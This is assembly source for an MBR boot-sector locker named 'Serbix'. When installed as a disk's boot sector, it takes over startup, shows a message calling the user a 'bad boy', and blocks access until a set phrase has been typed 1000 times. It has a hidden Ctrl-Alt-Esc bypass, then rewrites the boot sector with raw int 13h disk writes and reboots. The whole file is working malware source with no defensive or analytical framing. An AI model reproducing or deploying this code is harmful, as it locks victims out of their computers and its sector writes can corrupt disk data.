cpu 386
bits 16
org 0h


start:                        ;Ok, dont change this stuff either..
    jmp short load_prog
    ident db "Serbix"

;=====================================================================================================================

load_prog:
    cld
    xor ax,ax
    mov ss,ax
    mov sp, 7c00h             ;Setup stack

    mov ax, 8000h
    mov es, ax                ;Initialize es w/ 8000h
    mov ds, ax                ;Initialize ds w/ 8000h

;=====================================================================================================================

load_1:
    mov ax, 0206h             ;Function/# of sec to read
    mov cx, 0001h             ;0-5 sec # (counts from one), 6-7 hi cyl bits

    ;MDP - Do not clobber DL, it still has the boot drive passed by BIOS
    mov dh, 00h               ;Dh=head dl=drive (bit 7=hdd)
    mov bx, 0h                ;Data buffer, points to es:0
    int 13h
    cmp ah, 0
    jne load_1                ;This is allowable because it is relative

    ;MDP - Save boot drive after you set the proper DS segment (0x8000) and after you read the sector into memory
    mov [boot_drive], dl

    push es
    mov ax, prog_continue
    push ax
    retf

;=====================================================================================================================    

prog_continue:
    mov ah, 07h                ;Function to call with interrupt
    mov al, 0x00               ;Scroll whole window
    mov bh, 0x0F               ;Black background with white text
    mov cx, 0x0000             ;Row 0,col 0
    mov dx, 0x184f
    int 10h

    mov dh, 0                  ;Cursor position row
    mov dl, 0                  ;Cursor position column
    mov ah, 02h                ;Set cursor position
    mov bh, 0                  ;Display page number
    int 10h                    ;Call interrupt

    jmp write_message

;=====================================================================================================================

print_str:
    push ax
    push di
    mov ah, 0eh
.getchar:
    lodsb                      ;Same as mov al,[si] and inc si
    test al, al                ;Same as cmp al,0
    jz .end
    int 10h
    jmp .getchar
.end:
    pop di
    pop ax
    ret

uint32_to_str:
    push edx
    push eax
    push ecx
    push bx
    push di
    xor bx, bx                 ;Digit count
    mov ecx, 10                ;Divisor
.digloop:
    xor edx, edx               ;Division will use 64-bit dividend in EDX:EAX
    div ecx                    ;Divide EDX:EAX by 10 ; EAX=Quotient ; EDX=Remainder(the current digit)
    add dl, '0'                ;Convert digit to ASCII
    push dx                    ;Push on stack so digits can be popped off in everse order when finished
    inc bx                     ;Digit count += 1
    test eax, eax
    jnz .digloop               ;If dividend is zero then we are finished converting the number
.popdigloop:                   ;Get digits from stack in reverse order we pushed them
    pop ax
    stosb                      ;Same as mov [ES:DI], al and inc di
    dec bx
    jne .popdigloop            ;Loop until all digits have been popped
    mov al, 0
    stosb                      ;NUL terminate string ; Same as mov [ES:DI], al and inc di
    pop di
    pop bx
    pop ecx
    pop eax
    pop edx
    ret

;=====================================================================================================================

write_message:
    mov si, msg1               ;DS:SI points to string buffer to print
    call print_str

    mov si, password           ;DS:SI points to string buffer to print
    call print_str

    mov si, msg2               ;DS:SI points to string buffer to print
    call print_str

    mov eax, [counter]
    mov di, strbuf             ;ES:DI points to string buffer to store to
    call uint32_to_str         ;Convert 32-bit unsigned value in EAX to ASCII string
    mov si, di                 ;DS:SI points to string buffer to print
    call print_str

next:
    mov dh, 23                 ;Cursor position row
    mov dl, 1                  ;Cursor position column
    mov ah, 02h                ;Set cursor position
    mov bh, 0                  ;Display page number
    int 10h                    ;Call interrupt

    mov si, phrase
    call print_str
    mov si, buffer

get_keystrokes:
    xor al, al                 ;Clear buffer
    mov ah, 0h                 ;AH = 0
    cmp ah, 0h                 ;Check same or not same
    jne get_keystrokes         ;If same continue else abort

    xor ah, ah                 ;AH = 0
    int 16h                    ;Wait for key
    cmp ah, 01h                ;Scan code 1 = Escape
    jne next_keystrokes        ;If Escape not pressed skip

    mov ah, 86h                ;AH = 86
    mov cx, 50                 ;Set for timeout 50
    int 15h                    ;Wait function

    mov ah, 2h
    int 16h                    ;Query keyboard status flags
    and al, 0b00001111         ;Mask all the key press flags
    cmp al, 0b00001100         ;Check if ONLY Control and Alt are pressed and make sure Left and/or Right Shift are not being pressed
    jne next_keystrokes        ;If not go back and wait for another keystroke ; Otherwise Control-Alt-Escape has been pressed
    jmp RestoreMBR

next_keystrokes:
    mov ah, 03h                ;Get current cusror position
    mov bh, 0                  ;Display page number
    int 10h                    ;Call interrupt

    cmp al, 0                  ;Check for nothing
    je get_keystrokes

    cmp al, 9                  ;Disable tab
    je get_keystrokes

    cmp al, 8                  ;Check for backsapce
    je backspace

    cmp al, 13                 ;Check for enter
    je compare

    cmp dl, 78                 ;Don't let string to get to second line
    je get_keystrokes

    mov ah, 0Eh                ;Teletype user inputed character
    int 10h                    ;Call interrupt
    mov byte [si], al
    inc si
    jmp get_keystrokes

backspace:
    cmp dl, phrase_len         ;Make so we don't accidentally delete text contained in phrase_len
    je get_keystrokes
    dec dl

    mov ah, 02h                ;Set cursor position
    mov bh, 0                  ;Page number
    int 10h                    ;Jump one column before

    mov al, 0                  ;Zero scancode
    mov ah, 0Eh                ;Teletype character
    int 10h                    ;Call interrupt

    dec si
    mov byte [si], 0           ;Clear buffer

    mov ah, 02h                ;Set cursor position
    mov bh, 0                  ;Page number
    int 10h                    ;Jump one column before

    jmp get_keystrokes

compare:
    lea esi, [password]
    lea edi, [buffer]
    mov ecx, password_len      ;Selects the length of the first string as maximum for comparison
    rep cmpsb                  ;Comparison of ECX number of bytes
    mov eax, 4                 ;Does not modify flags
    mov ebx, 1                 ;Does not modify flags
    mov si, buffer             ;Store in si address of buffer
    jne .ClearAll              ;Checks zero flag
    jmp .CheckNumber           ;If password matches decrease counter
.CheckNumber:
    mov eax, [counter]
    sub eax, 1                 ;Decrease value by 1
    mov [counter], eax         ;Store final value in counter

    mov eax, [counter]
    cmp eax, 0
    je RestoreMBR
    jmp prog_continue
.ClearAll:
    mov ah, 02h                ;Set cursor position
    mov bh, 0                  ;Page number
    int 10h                    ;Jump one column before

    mov byte [si], 0           ;Clear buffer
    inc si

    cmp dl, phrase_len         ;Clear everything until text contained in msg
    je next
    dec dl

    mov ah, 02h                ;Set cursor position
    mov bh, 0                  ;Page number
    int 10h                    ;Jump one column before

    mov al, 0                  ;Zero scancode
    mov ah, 0Eh                ;Teletype character
    int 10h                    ;Call interrupt

    mov ah, 02h                ;Set cursor position
    mov bh, 0                  ;Page number
    int 10h                    ;Jump one column before

    jmp .ClearAll

;=====================================================================================================================

RestoreMBR:
    mov ax, 7c0h              ;Setup segments ;AX=7c0h
    mov es, ax

    xor ax, ax                ;AX=0
    mov ss, ax                
    mov sp, 0x7c00            ;SS:SP = 0x0000:0x7c00 stack just below bootloader

    ;Read sector - 2th
    mov bx, buffer            ;ES: BX must point to the buffer
    mov dl, [boot_drive]      ;Use boot drive passed to bootloader by BIOS in DL
    mov dh, 0                 ;Head number
    mov ch, 0                 ;Track number
    mov cl, 2                 ;Sector number - (2th)
    mov al, 1                 ;Number of sectors to read
    mov ah, 2                 ;Read function number
    int 13h                   ;Call interrupt

    ;Write sector - 1th
    mov bx, buffer            ;ES: BX must point to the buffer
    mov dl, [boot_drive]      ;Use boot drive passed to bootloader by BIOS in DL
    mov dh, 0                 ;Head number
    mov ch, 0                 ;Track number
    mov cl, 1                 ;Sector number - (1th)
    mov al, 8                 ;Number of sectors to write
    mov ah, 3                 ;Write function number
    int 13h                   ;Call interrupt

RebootPC:
    xor ax, ax
    mov es, ax
    mov bx, 1234
    mov [es:0472], bx
    cli
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, ax
    mov ax, 2
    push ax
    mov ax, 0xf000
    push ax
    mov ax, 0xfff0
    push ax
    iret

;=====================================================================================================================

MBR_Signature:
    counter dd 1000
    boot_drive dd 0
    strbuf db 0
    times 510-($-$$) db 0
    db 55h,0aah
    times 1024-($-$$) db 0
    msg1: db 'You have been a bad boy and now you have to write the phrase:', 13, 10, '"', 0
    msg2: db '" 1000 times to restore your computer.', 13, 10, 13, 10, 'Counter: ', 0
    password: db 'I am a bad boy. Excuse me please!', 0
    password_len: equ $-password
    phrase: db 'Phrase: ', 0
    phrase_len: equ $-phrase
    times 4096-($-$$) db 0
    buffer: